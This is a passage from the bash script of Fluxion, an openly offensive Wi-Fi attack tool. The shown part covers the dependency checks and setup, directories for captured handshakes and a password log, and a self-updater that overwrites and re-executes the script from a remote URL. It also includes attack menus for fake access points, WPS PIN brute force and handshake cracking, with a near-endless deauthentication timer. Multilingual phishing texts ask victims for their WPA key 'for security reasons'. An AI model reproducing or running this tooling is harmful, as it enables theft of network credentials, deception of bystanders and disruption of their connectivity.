#!/bin/bash

########## DEBUG Mode ##########
##			      ##
if [ -z ${FLUX_DEBUG+x} ]; then FLUX_DEBUG=0
else FLUX_DEBUG=1
fi
##			      ##
################################

if [[ $EUID -ne 0 ]]; then
        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root."$transparent""
        exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[1;31mThe script should be executed inside a X (graphical) session."$transparent""
    exit 1
fi

clear

##################################### < CONFIGURATION  > #####################################
DUMP_PATH="/tmp/TMPflux"
HANDSHAKE_PATH="/root/handshakes"
PASSLOG_PATH="/root/pwlog"
WORK_DIR=`pwd`
ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`
# Deauth duration during handshake capture
# oo
DEAUTHTIME="9999999999999"
revision=55
version=0.23
IP=192.168.1.1
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"


general_back="Back"
general_error_1="Not_Found"
general_case_error="Unknown option. Choose again"
general_exitmode="Cleaning and closing"
general_exitmode_1="Disabling monitoring interface"
general_exitmode_2="Disabling interface"
general_exitmode_3="Disabling "$grey"forwarding of packets"
general_exitmode_4="Cleaning "$grey"iptables"
general_exitmode_5="Restoring "$grey"tput"
general_exitmode_6="Restarting "$grey"Network-Manager"
general_exitmode_7="Cleanup performed successfully!"
general_exitmode_8="Thanks for using fluxion"
##############################################################################################

# DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
if [ $FLUX_DEBUG = 1 ]; then
	## Developer Mode
	export flux_output_device=/dev/stdout
	HOLD="-hold"
else
	## Normal Mode
	export flux_output_device=/dev/null
	HOLD=""
fi

# Delete Log only in Normal Mode !
function conditional_clear() {

	if [[ "$flux_output_device" != "/dev/stdout" ]]; then clear; fi
}

function airmon {
	chmod +x airmon
}
airmon

# Check Updates
function checkupdatess {

	revision_online="$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
	if [ -z "$revision_online" ]; then
		echo "?">$DUMP_PATH/Irev
	else
		echo "$revision_online">$DUMP_PATH/Irev
	fi

}

# Animation
function spinner {

	local pid=$1
	local delay=0.15
	local spinstr='|/-\'
		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
			local temp=${spinstr#?}
			printf " [%c]  " "$spinstr"
			local spinstr=$temp${spinstr%"$temp"}
			sleep $delay
			printf "\b\b\b\b\b\b"
		done
	printf "    \b\b\b\b"
}

# ERROR Report only in Developer Mode
function err_report {
	echo "Error on line $1"
}

if [ "$FLUX_DEBUG" = "1" ]; then
        trap 'err_report $LINENUM' ERR
fi

#Function to executed in case of unexpected termination
trap exitmode SIGINT SIGHUP

# KILL ALL
function exitmode {
	conditional_clear
	top
	echo -e "\n\n"$white"["$red"-"$white"] "$red"$general_exitmode"$transparent""

	if ps -A | grep -q aireplay-ng; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
		killall aireplay-ng &>$flux_output_device
	fi

	if ps -A | grep -q airodump-ng; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
		killall airodump-ng &>$flux_output_device
	fi

	if ps a | grep python| grep fakedns; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"python"$transparent""
		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
	fi

	if ps -A | grep -q hostapd; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"hostapd"$transparent""
		killall hostapd &>$flux_output_device
	fi

	if ps -A | grep -q lighttpd; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"lighttpd"$transparent""
		killall lighttpd &>$flux_output_device
	fi

	if ps -A | grep -q dhcpd; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"dhcpd"$transparent""
		killall dhcpd &>$flux_output_device
	fi

	if ps -A | grep -q mdk3; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"mdk3"$transparent""
		killall mdk3 &>$flux_output_device
	fi

	if [ "$WIFI_MONITOR" != "" ]; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$green"$WIFI_MONITOR"$transparent""
		./airmon stop $WIFI_MONITOR &> $flux_output_device
	fi


	if [ "$WIFI" != "" ]; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$green"$WIFI"$transparent""
		./airmon stop $WIFI &> $flux_output_device
		macchanger -p $WIFI &> $flux_output_device
	fi


	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_3"$transparent""
		sysctl -w net.ipv4.ip_forward=0 &>$flux_output_device
	fi

	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_4"$transparent""
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain

	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_5"$transparent""
	tput cnorm

	if [ $FLUX_DEBUG != 1 ]; then

		echo -e ""$white"["$red"-"$white"] "$white"Delete "$grey"files"$transparent""
		rm -R $DUMP_PATH/* &>$flux_output_device
	fi

	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
	service network-manager restart &> $flux_output_device &
	service networking restart &> $flux_output_device &
	service restart networkmanager &> $flux_output_device &
	echo -e ""$white"["$green"+"$white"] "$green"$general_exitmode_7"$transparent""
	echo -e ""$white"["$green"+"$white"] "$grey"$general_exitmode_8"$transparent""
	sleep 2
	clear
	exit

}

# Generate a list of web interfaces
readarray -t webinterfaces < <(echo -e "Web Interface
\e[1;31mExit"$transparent""
)

# Generate a list of web translations
readarray -t webinterfaceslenguage < <(echo -e "English [ENG]
Spanish[ESP] GERMAN [GER]
\e[1;31m$general_back"$transparent""
)

#Language for Web Interface
#GER
DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen geben sie bitte <b>"$Host_ENC"</b> den WPA2 Schlüssel ein"
DIALOG_WEB_INPUT_GER="Geben sie den WPA2 Schlüssel ein"
DIALOG_WEB_SUBMIT_GER="Bestätigen"
DIALOG_WEB_ERROR_GER="<b><font color=\"red\" size=\"3\">Error</font>:</b> Das eingegebene Passwort ist <b>nicht</b> Korrekt!</b>"
DIALOG_WEB_OK_GER="Die Verbindung wird in wenigen Sekunden wiederhergestellt"
DIALOG_WEB_BACK_GER="$general_back"
DIALOG_WEB_LENGHT_MIN_GER="Das Passwort muss länger als 7 Zeichen sein"
DIALOG_WEB_LENGHT_MAX_GER="Das Passwort muss kürzer als 64 Zeichen sein"

#EN
DIALOG_WEB_INFO_ENG="For security reasons, enter the <b>"$Host_ENC"</b> key to access the Internet"
DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
DIALOG_WEB_SUBMIT_ENG="Submit"
DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b>"
DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
DIALOG_WEB_BACK_ENG="$general_back"
DIALOG_WEB_LENGHT_MIN_ENG="The password must be more than 7 characters"
DIALOG_WEB_LENGHT_MAX_ENG="The password must be less than 64 characters"

#ESP
DIALOG_WEB_INFO_ESP="Por razones de seguridad, introduzca la contrase&ntilde;a <b>"$Host_ENC"</b> para acceder a Internet"
DIALOG_WEB_INPUT_ESP="Introduzca su contrase&ntilde;a WPA:"
DIALOG_WEB_SUBMIT_ESP="Enviar"
DIALOG_WEB_ERROR_ESP="<b><font color=\"red\" size=\"3\">Error</font>:</b> La contrase&ntilde;a introducida <b>NO</b> es correcta!</b>"
DIALOG_WEB_OK_ESP="Su conexi&oacute;n se restablecer&aacute; en breves momentos."
DIALOG_WEB_BACK_ESP="Atr&aacute;s"
DIALOG_WEB_LENGHT_MIN_ESP="La clave debe ser superior a 7 caracteres"
DIALOG_WEB_LENGHT_MAX_ESP="La clave debe ser inferior a 64 caracteres"

#IT
DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave <b>"$Host_ENC"</b> per accedere a Internet"
DIALOG_WEB_INPUT_IT="Inserisci la tua password WPA:"
DIALOG_WEB_SUBMIT_IT="Invia"
DIALOG_WEB_ERROR_IT="<b><font color=\"red\" size=\"3\">Errore</font>:</b> La password <b>NON</b> &egrave; corretta!</b>"
DIALOG_WEB_OK_IT="La connessione sar&agrave; ripristinata in pochi istanti."
DIALOG_WEB_BACK_IT="Indietro"
DIALOG_WEB_LENGHT_MIN_IT="La password deve essere superiore a 7 caratteri"
DIALOG_WEB_LENGHT_MAX_IT="La password deve essere inferiore a 64 caratteri"

#FR
DIALOG_WEB_INFO_FR="Pour des raisons de s&eacute;curit&eacute;, veuillez introduire <b>"$Host_ENC"</b> votre cl&eacute; pour acceder &agrave; Internet"
DIALOG_WEB_INPUT_FR="Entrez votre cl&eacute; WPA:"
DIALOG_WEB_SUBMIT_FR="Valider"
DIALOG_WEB_ERROR_FR="<b><font color=\"red\" size=\"3\">Error</font>:</b> La cl&eacute; que vous avez introduit <b>NOT</b> est incorrecte!</b>"
DIALOG_WEB_OK_FR="Veuillez patienter quelques instants."
DIALOG_WEB_BACK_FR="Pr&eacute;c&eacute;dent"
DIALOG_WEB_LENGHT_MIN_FR="La passe dois avoir plus de 7 digits"
DIALOG_WEB_LENGHT_MAX_FR="La passe dois avoir moins de 64 digits"

#POR
DIALOG_WEB_INFO_POR="Por raz&#245;es de seguran&#231;a, digite a senha para acessar a Internet"
DIALOG_WEB_INPUT_POR="Digite sua senha WPA"
DIALOG_WEB_SUBMIT_POR="Enviar"
DIALOG_WEB_ERROR_POR="<b><font Color=\"red\" size=\"3\">Erro</font>:</b> A senha digitada <b>N&#195;O</b> est&#225; correto </b>!"
DIALOG_WEB_OK_POR="Sua conex&#227;o &#233; restaurada em breve."
DIALOG_WEB_BACK_POR="Voltar"
DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"

# Design
function top(){

	conditional_clear
	echo -e "$blue#########################################################"
	echo -e "$blue#                                                       #"
  echo -e "$blue#  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "          ${blue}"  #"
	echo -e "$blue#"${yellow} by "${red}D""${yellow}eltax", "${red}"S""${yellow}"trasharo and "${red}A""${yellow}patheticEuphoria"           "    ${blue}#""
	echo -e "$blue#                                                       #"
	echo -e "$blue#########################################################""$transparent"
	echo
	echo

}

##################################### < END OF CONFIGURATION SECTION > #####################################






############################################## < START > ##############################################

# Check requirements
function checkdependences {

	echo -ne "Aircrack-ng....."
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Aireplay-ng....."
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Airmon-ng......."
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Airodump-ng....."
	if ! hash airodump-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Awk............."
	if ! hash awk 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Bully..........."
	if ! hash bully 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Curl............"
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Dhcpd..........."
	if ! hash dhcpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Hostapd........."
	if ! hash hostapd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Iwconfig........"
	if ! hash iwconfig 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Lighttpd........"
	if ! hash lighttpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Macchanger......"
	if ! hash macchanger 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
	    echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Mdk3............"
	if ! hash mdk3 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1

	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Nmap............"
	if ! [ -f /usr/bin/nmap ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Php5-cgi........"
	if ! [ -f /usr/bin/php-cgi ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Pyrit..........."
	if ! hash pyrit 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Python.........."
	if ! hash python 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Reaver.........."
	if ! hash reaver 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Unzip..........."
	if ! hash unzip 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Xterm..........."
	if ! hash xterm 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Zenity.........."
	if ! hash zenity 2>/tmp/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Openssl........."
	if ! hash openssl 2>/tmp/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "rfkill.........."
        if ! hash rfkill 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "strings........."
        if ! hash strings 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent" (binutils)"
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025


	if [ "$exit" = "1" ]; then
	exit 1
	fi

	sleep 1
	clear
}
top
checkdependences

# Create working directory
if [ ! -d $DUMP_PATH ]; then
	mkdir -p $DUMP_PATH &>$flux_output_device
fi

# Create handshake directory
if [ ! -d $HANDSHAKE_PATH ]; then
        mkdir -p $HANDSHAKE_PATH &>$flux_output_device
fi

#create password log directory
if [ ! -d $PASSLOG_PATH ]; then
        mkdir -p $PASSLOG_PATH &>$flux_output_device
fi



if [ $FLUX_DEBUG != 1 ]; then
	echo ""
		   sleep 0.1 && echo -e "$red "
           sleep 0.1 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
           sleep 0.1 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
           sleep 0.1 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
           sleep 0.1 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "
           sleep 0.1 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
           sleep 0.1 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "

	echo""

	sleep 1
	echo -e $red"                     FLUX "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax"
	sleep 1
	echo -e $green "           Page:"$red" https://github.com/deltaxflux/fluxion "$transparent
	sleep 1
	echo -n "                              Latest rev."
	tput civis
	checkupdatess &
	spinner "$!"
	revision_online=$(cat $DUMP_PATH/Irev)
	echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
		if [ "$revision_online" != "?" ]; then

			if [ "$revision" != "$revision_online" ]; then

				cp $0 $HOME/flux_rev-$revision.backup
				curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" -s -o $0
				echo
				echo
				echo -e ""$red"
Updated successfully! Restarting the script to apply the changes ..."$transparent""
				sleep 5
				chmod +x $0
				exec $0

			fi
		fi
	echo ""
	tput cnorm
	sleep 2

fi

# Show info for the selected AP
function infoap {

	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
	echo "INFO WIFI"
	echo
	echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
	echo -e "               "$blue"Channel"$transparent" = $channel"
	echo -e "               "$blue"Speed"$transparent" = ${speed:2} Mbps"
	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
	echo
}

############################################## < START > ##############################################






############################################### < MENU > ###############################################

# Windows + Resolution
function setresolution {

	function resA {

		TOPLEFT="-geometry 90x13+0+0"
		TOPRIGHT="-geometry 83x26-0+0"
		BOTTOMLEFT="-geometry 90x24+0-0"
		BOTTOMRIGHT="-geometry 75x12-0-0"
		TOPLEFTBIG="-geometry 91x42+0+0"
		TOPRIGHTBIG="-geometry 83x26-0+0"
	}

	function resB {

		TOPLEFT="-geometry 92x14+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 92x36+0-0"
		BOTTOMRIGHT="-geometry 74x20-0-0"
		TOPLEFTBIG="-geometry 100x52+0+0"
		TOPRIGHTBIG="-geometry 74x30-0+0"
	}
	function resC {

		TOPLEFT="-geometry 100x20+0+0"
		TOPRIGHT="-geometry 109x20-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 109x20-0-0"
		TOPLEFTBIG="-geometry  100x52+0+0"
		TOPRIGHTBIG="-geometry 109x30-0+0"
	}
	function resD {
		TOPLEFT="-geometry 110x35+0+0"
		TOPRIGHT="-geometry 99x40-0+0"
		BOTTOMLEFT="-geometry 110x35+0-0"
		BOTTOMRIGHT="-geometry 99x30-0-0"
		TOPLEFTBIG="-geometry 110x72+0+0"
		TOPRIGHTBIG="-geometry 99x40-0+0"
	}
	function resE {
		TOPLEFT="-geometry 130x43+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 130x40+0-0"
		BOTTOMRIGHT="-geometry 132x35-0-0"
		TOPLEFTBIG="-geometry 130x85+0+0"
		TOPRIGHTBIG="-geometry 132x48-0+0"
	}
	function resF {
		TOPLEFT="-geometry 100x17+0+0"
		TOPRIGHT="-geometry 90x27-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 90x20-0-0"
		TOPLEFTBIG="-geometry  100x70+0+0"
		TOPRIGHTBIG="-geometry 90x27-0+0"
}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
	"1024x600" ) resA ;;
	"1024x768" ) resB ;;
	"1280x768" ) resC ;;
	"1366x768" ) resC ;;
	"1280x1024" ) resD ;;
	"1600x1200" ) resE ;;
	"1366x768"  ) resF ;;
		  * ) resA ;;
esac

language
}

function language {

	conditional_clear

	while true; do
		conditional_clear
		top

		echo "Select your language"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" German          "
		echo -e "      "$blue"2)"$transparent" English      "
		echo -e "      "$blue"3)"$transparent" Romanian     "
		echo -e "      "$blue"4)"$transparent" Turkish    "
		echo -e "      "$blue"5)"$transparent" Spanish    "
		echo -e "      "$blue"6)"$transparent" Chinese   "
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) german; break ;;
			2 ) english; break ;;
			3 ) romanian; break;;
			4 ) turkish; break;;
			5 ) spain; break;;
			6 ) chinese; break;;
			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
		  esac
	done
}

function german {
	header_setinterface="Wähle deine Netzwerk Karte"
	setinterface_error="Es wurden keine Netzwerk Karten gefunden, beende..."

	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="Wähle dein Kanal"

	choosescan_option_1="Alle Kanäle"
	choosescan_option_2="Spezifische Kanal(e)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="Einzelner Kanal"
	scanchan_option_2="Mehrere Kanäle"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scan="WIFI Monitor"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="Scane Netwerke..."
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="Wähle deine Angriffs Methode"
	askAP_option_1="FakeAP - Hostapd ("$red"Empfohlen)"
	askAP_option_2="FakeAP - airbase-ng (Langsame Verbindung)"
	askAP_option_3="WPS-SLAUGHTER - Bruteforce WPS Pin"
	askAP_option_4="Bruteforce - (Handshake wird benötigt)"
	general_back="Zurück"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="Methode um den Handshake zu Prüfen"
	askauth_option_1="Handshake ("$red"Empfohlen)"
	askauth_option_2="Wpa_supplicant(Mehrere Ausfälle)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="Handshake überprüfung"
	deauthforce_option_1="aircrack-ng (Ausfall möglich)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*Erfassung des Handshake*"
	deauthMENU_option_1="Überprüfe handshake"
	deauthMENU_option_2="Starte neu"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="Wähle deine Strategie"
	header_ConnectionRESET="Wähle deine login Seite"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_case_error="Unbekannte Option, wähle neu"
	general_error_1="Nicht gefunden"
	general_error_2="Datei wurde ${red}nicht$transparent gefunden"
	general_back="Zurück"
	general_exitmode="Aufräumen und schließen"
	general_exitmode_1="Deaktivierung des Monitor Interface"
	general_exitmode_2="Deaktivierung des Interface"
	general_exitmode_3="Deaktivierung "$grey"von weiterleiten von Paketen"
	general_exitmode_4="Säubere "$grey"iptables"
	general_exitmode_5="Wiederherstellung von"$grey"tput"
	general_exitmode_6="Neustarten des "$grey"Netzwerk Manager"
	general_exitmode_7="Wiederherstellung war erfolgreich"
	general_exitmode_8="Vielen Dank für das nutzen von Fluxion"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="Mit aktive Nutzer"
	selection_2="Wähle dein Angriffsziel. Um neuzuscannen tippe $red r$transparent"
	setinterface
}

function english {
	header_setinterface="Select an interface"
	setinterface_error="There are no wireless cards, quit..."

	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="Select channel"
	choosescan_option_1="All channels "
	choosescan_option_2="Specific channel(s)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="Single channel"
	scanchan_option_2="Multiple channels"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scan="WIFI Monitor"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="Scanning Target"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="Select Attack Option"
	askAP_option_1="FakeAP - Hostapd ("$red"Recommended)"
	askAP_option_2="FakeAP - airbase-ng (Slower connection)"
	askAP_option_3="WPS-SLAUGHTER - Bruteforce WPS Pin"
	askAP_option_4="Bruteforce - (Handshake is required)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="METHOD TO VERIFY THE PASSWORD"
	askauth_option_1="Handshake ("$red"Recommended)"
	askauth_option_2="Wpa_supplicant(More failures)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="Handshake check"
	deauthforce_option_1="aircrack-ng (Miss chance)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*Capture Handshake*"
	deauthMENU_option_1="Check handshake"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="Select your option"
	header_ConnectionRESET="Select Login Page"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_back="Back"
	general_error_1="Not_Found"
	general_case_error="Unknown option. Choose again"
	general_exitmode="Cleaning and closing"
	general_exitmode_1="Disabling monitoring interface"
	general_exitmode_2="Disabling interface"
	general_exitmode_3="Disabling "$grey"forwarding of packets"
	general_exitmode_4="Cleaning "$grey"iptables"
	general_exitmode_5="Restoring "$grey"tput"
	general_exitmode_6="Restarting "$grey"Network-Manager"
	general_exitmode_7="Cleanup performed successfully!"
	general_exitmode_8="Thanks for using fluxion"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="Active clients"
	selection_2="Select target. For rescan type$red r$transparent"
	setinterface
}

function romanian {
	header_setinterface="Selecteaza o interfata"
    setinterface_error="Nu este nici o placa de retea wireless, iesire..."

    #
